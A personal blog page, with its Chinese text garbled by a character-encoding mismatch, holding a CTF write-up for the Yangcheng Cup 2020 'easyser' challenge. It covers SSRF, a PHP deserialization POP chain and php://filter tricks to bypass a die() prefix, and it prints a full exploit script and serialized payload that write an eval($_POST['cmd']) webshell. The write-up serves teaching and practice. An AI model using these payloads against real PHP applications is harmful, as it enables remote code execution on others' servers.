<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[ç¾ŠåŸæ¯ 2020]easyser | he11çš„å†œåœº</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://dydydy123.github.io/favicon.ico?v=1686555449410">
<link rel="stylesheet" href="https://dydydy123.github.io/styles/main.css">



<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="
è®¿é—®é¦–é¡µæ²¡æœ‰ä»»ä½•ä¸œè¥¿


æŸ¥çœ‹robots.txtï¼Œè·å¾—è·¯å¾„/star1.php


è®¿é—®/star1.phpï¼ŒæŸ¥çœ‹ç½‘é¡µæºç è·å¾—hintï¼Œä»ä¸å®‰å…¨çš„åè®®(HTTP)ï¼Œæˆ‘å®¶(127.0.0.1)æ¨æµ‹éœ€é€šè¿‡ssrfè®¿é—®ser.php


æºç ..." />
    <meta name="keywords" content="phpååºåˆ—åŒ–,æ­»äº¡exit" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://dydydy123.github.io">
        <img src="https://dydydy123.github.io/images/avatar.png?v=1686555449410" class="site-logo">
        <h1 class="site-title">he11çš„å†œåœº</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
        
          <a href="https://dydydy123.github.io/post/you-lian" class="site-nav">
            å‹é“¾
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      ganma~~~~~~~~~~
    </div>
    <div class="site-footer">
       | <a class="rss" href="https://dydydy123.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[ç¾ŠåŸæ¯ 2020]easyser</h2>
            <div class="post-date">2022-10-19</div>
            
              <div class="feature-container" style="background-image: url('https://dydydy123.github.io/post-images/yang-cheng-bei-2020easyser.jpg')">
              </div>
            
            <div class="post-content" v-pre>
              <!-- more -->
<p>è®¿é—®é¦–é¡µæ²¡æœ‰ä»»ä½•ä¸œè¥¿<br>
<img src="https://dydydy123.github.io/post-images/1666179106493.png" alt="" loading="lazy"></p>
<!-- more -->
<p>æŸ¥çœ‹robots.txtï¼Œè·å¾—è·¯å¾„/star1.php<br>
<img src="https://dydydy123.github.io/post-images/1666179186532.png" alt="" loading="lazy"></p>
<!-- more -->
<p>è®¿é—®/star1.phpï¼ŒæŸ¥çœ‹ç½‘é¡µæºç è·å¾—hintï¼Œä»ä¸å®‰å…¨çš„åè®®(HTTP)ï¼Œæˆ‘å®¶(127.0.0.1)æ¨æµ‹éœ€é€šè¿‡ssrfè®¿é—®ser.php<br>
<img src="https://dydydy123.github.io/post-images/1666179236763.png" alt="" loading="lazy"></p>
<!-- more -->
<p>æºç åˆ†æï¼š</p>
<pre><code>&lt;?php
error_reporting(0);
if ( $_SERVER['REMOTE_ADDR'] == &quot;127.0.0.1&quot; ) {
    highlight_file(__FILE__);
} 
$flag='{Trump_:&quot;fake_news!&quot;}';
class GWHT{
    public $hero;
    public function __construct(){
        $this-&gt;hero = new Yasuo;
    }
    public function __toString(){
        if (isset($this-&gt;hero)){
            return $this-&gt;hero-&gt;hasaki();
        }else{
            return &quot;You don't look very happy&quot;;
        }
    }
}
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -&gt; file = $file;
        $this -&gt; text = $text;
    }
    public function hasaki(){
        $d   = '&lt;?php die(&quot;nononon&quot;);?&gt;';
        $a= $d. $this-&gt;text;
         @file_put_contents($this-&gt; file,$a);
    }
}
class Yasuo{
    public function hasaki(){
        return &quot;I'm the best happy windy man&quot;;
    }
} 
</code></pre>
<p>ä»æºç å¯çœ‹å‡ºè€ƒç‚¹ä¸ºphpååºåˆ—åŒ–åŠ æ­»äº¡ç»•è¿‡ã€‚ä½†æ˜¯å¹¶æœªå‘ç°ååºåˆ—ä¸Šä¼ åˆ©ç”¨çš„ç‚¹ã€‚ä½¿ç”¨arjunæ‰«æå¯èƒ½å­˜åœ¨çš„æ³¨å…¥ç‚¹ã€‚</p>
<!-- more -->
<figure data-type="image" tabindex="1"><img src="https://dydydy123.github.io/post-images/1666180401237.png" alt="" loading="lazy"></figure>
<!-- more -->
<p>å‘ç°è¿˜å­˜åœ¨ä¸€ä¸ªæ³¨å…¥ç‚¹cï¼Œå°è¯•è¾“å…¥ä¸€ä¸‹ååºåˆ—åŒ–</p>
<pre><code>é™„ä¸Šå¸ˆå‚…ä»¬å‘çš„cå‚æ•°é€»è¾‘
$c=$_GET['c']; 
    if(isset($c)){
        echo $x = unserialize($c);  //echo çš„æ—¶å€™ä¼šè§¦å‘ __toString() é­”æœ¯æ–¹æ³•
    }
    else{
        echo &quot;your hat is too black!&quot;;
    }

</code></pre>
<!-- more -->
<p>ç›®çš„é€šè¿‡file_put_contents(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>âˆ’</mo><mo>&gt;</mo><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">this-&gt; file,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mpunct">,</span></span></span></span>a);å†™å…¥ğŸ</p>
<!-- more -->
<p>popé“¾ï¼š<br>
GWHTçš„__toString()-&gt;Yongençš„hasaki()<br>
ä»æºç ä¸­å¹¶æœªå‘ç°__toString()çš„åˆ©ç”¨ç‚¹ï¼Œä½†popé“¾å¿…é¡»ç”¨åˆ°è¯¥æ–¹æ³•ï¼ŒçŒœæµ‹åç«¯å­˜åœ¨åˆ©ç”¨ç‚¹ã€‚</p>
<!-- more -->
<p>æ­»äº¡ç»•è¿‡æ–¹æ³•ï¼š</p>
<!-- more -->
<p>ä½¿ç”¨php://filteråè®®æœ‰ä¸¤ç§é€”å¾„å¯ç»•è¿‡ã€‚</p>
<!-- more -->
<p>1.ä½¿ç”¨string.strip_tagså­—ç¬¦ä¸²è¿‡æ»¤å™¨ï¼šå»é™¤htmlã€PHPè¯­è¨€æ ‡ç­¾ã€‚</p>
<!-- more -->
<p>æˆ‘ä»¬çš„ç›®çš„æ˜¯å†™å…¥ä¸€ä¸ªwebshellï¼Œè€Œå†™å…¥çš„webshellä¹Ÿæœ‰PHPè¯­è¨€æ ‡ç­¾ï¼Œå¦‚æœä½¿ç”¨strip_tagsåŒæ ·ä¼šè¢«å»é™¤ã€‚php://filterå…è®¸ä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œäºæ˜¯æˆ‘ä»¬æ·»åŠ  convert.base64-decode  å°†webshell  base64ç¼–ç è¾“å…¥ï¼Œconvert.base64-decodeä¼šå°†æˆ‘ä»¬çš„è¾“å…¥è§£ç å†™å¦‚æ–‡ä»¶ï¼Œè€Œ&lt;?php die(&quot;nononon&quot;);?è¢«string.strip_tagså¤„ç†å¤±æ•ˆã€‚</p>
<!-- more -->
<pre><code>$test-&gt;hero-&gt;file='php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php';
//&lt;?php @eval($_POST['cmd']);?&gt;
$test-&gt;hero-&gt;text='PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';
</code></pre>
<!-- more -->
<p>2.ä½¿ç”¨convert.base64-decodeè¿‡æ»¤å™¨å°†<?php die("nononon");?>è§£ç è¾“å…¥ã€‚base64ç¼–ç ä¸­åªåŒ…å«64ä¸ªå¯æ‰“å°å­—ç¬¦ï¼Œè€ŒPHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚<?php die("nononon");?>ä¸­å¯è¯†åˆ«å­—ç¬¦ä¸²ä¸ºphpdienononon(11ä¸ªå­—ç¬¦)base64è§£ç æ—¶æ¯4byteä¸€ç»„è¿›è¡Œï¼Œéœ€è¡¥3å­—ç¬¦,æ­¤å¤„è¡¥äº†aaaã€‚</p>
<!-- more -->
<pre><code>$test-&gt;hero-&gt;file='php://filter/write=convert.base64-decode/resource=shell.php';
$test-&gt;hero-&gt;text='aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';
</code></pre>
<!-- more -->
<p>expï¼š</p>
<!-- more -->
<pre><code>&lt;?php

class GWHT{
    public $hero;
}
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file='',$text='') {
        $this -&gt; file = $file;
        $this -&gt; text = $text;

    }
    public function hasaki(){
        $d   = '&lt;?php die(&quot;nononon&quot;);?&gt;';
        $a= $d. $this-&gt;text;
        @file_put_contents($this-&gt; file,$a);
    }
}
class Yasuo{
    public function hasaki(){
        return &quot;I'm the best happy windy man&quot;;
    }
}

$test = new GWHT();
$test-&gt;hero = new Yongen();
//string.strip_tagsè¿‡æ»¤å™¨:è¿‡æ»¤htmlï¼Œå’Œphpæ ‡ç­¾
//$test-&gt;hero-&gt;file='php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php';
//$test-&gt;hero-&gt;text='PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';

//convert.base64-decodeè¿‡æ»¤å™¨:å°†è¾“å…¥b64è§£å¯†åä¼ æ–‡ä»¶    '&lt;?php die(&quot;nononon&quot;);?';  è¢«b64è§£å¯†ååªçœä¸‹[a-z0-9A-Z+]  åŠphpdienonon  11ä¸ªå­—ç¬¦ï¼Œ
//b64è§£å¯†  4ä¸ªbyteï¼ˆå­—èŠ‚ï¼‰ä¸€ç»„ æ‰€ä»¥éœ€è¦æ·»åŠ 3ä¸ªaaa

//b64è§£å¯†ç›¸å¯¹äºå¦‚ä¸‹ä»£ç 
//$_GET['txt'] = preg_replace('|[^a-z0-9A-Z+/]|s', '', $_GET['txt']);
//base64_decode($_GET['txt']);
$test-&gt;hero-&gt;file='php://filter/write=convert.base64-decode/resource=shell.php';
$test-&gt;hero-&gt;text='aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=';
var_dump(serialize($test));
</code></pre>
<!-- more -->
<p>poc:</p>
<pre><code>path=http://127.0.0.1/ser.php&amp;c=O:4:&quot;GWHT&quot;:1:{s:4:&quot;hero&quot;;O:6:&quot;Yongen&quot;:2:{s:4:&quot;file&quot;;s:59:&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;;s:4:&quot;text&quot;;s:43:&quot;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;;}}
</code></pre>
<figure data-type="image" tabindex="2"><img src="https://dydydy123.github.io/post-images/1666181871640.png" alt="" loading="lazy"></figure>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://dydydy123.github.io/tag/4U_Qdkddw/" class="tag">
                    phpååºåˆ—åŒ–
                  </a>
                
                  <a href="https://dydydy123.github.io/tag/ToNq-gjvm/" class="tag">
                    æ­»äº¡exit
                  </a>
                
              </div>
            
            

            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>


  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  <script>
    hljs.initHighlightingOnLoad()
  </script>





  </body>
</html>
